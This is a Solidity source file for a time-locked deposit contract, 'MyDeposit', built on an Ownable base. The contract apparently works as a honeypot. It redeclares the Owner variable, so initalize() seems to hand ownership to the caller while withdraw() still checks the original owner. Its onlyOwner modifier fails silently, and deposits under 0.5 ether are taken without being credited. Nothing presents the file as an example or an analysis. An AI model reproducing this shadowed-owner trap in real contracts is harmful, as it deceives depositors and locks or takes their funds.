/*
   Copyright (C) 2018  The Halo Platform
   https://www.haloplatform.tech/
   Scott Morrison

   This is free software and you are welcome to redistribute it under certain
   conditions. ABSOLUTELY NO WARRANTY; for details visit:
   https://www.gnu.org/licenses/gpl-2.0.html
*/
pragma solidity ^0.4.24;

contract Ownable {
    address public Owner;
    constructor() public { Owner = msg.sender; }
    modifier onlyOwner() { if (Owner == msg.sender) { _; } }
    
    function transferOwner(address _Owner) public onlyOwner {
        if (_Owner != address(0))
            Owner = _Owner;
    }
}

contract MyDeposit is Ownable {
    address public Owner;
    mapping (address => uint) public deposits;
    uint public openDate;
    
    function initalize(uint _openDate) payable public {
        Owner = msg.sender;
        openDate = _openDate;
        deposit();
    }
    
    function() public payable {  }
    
    function deposit() public payable {
        if (msg.value >= 0.5 ether)
            deposits[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public onlyOwner {
        if (now >= openDate) {
            uint max = deposits[msg.sender];
            if (amount <= max && max > 0)
                if (!msg.sender.send(amount))
                    revert();
        }
    }
    
    function kill() public {
        if (address(this).balance == 0)
            selfdestruct(msg.sender);
    }
}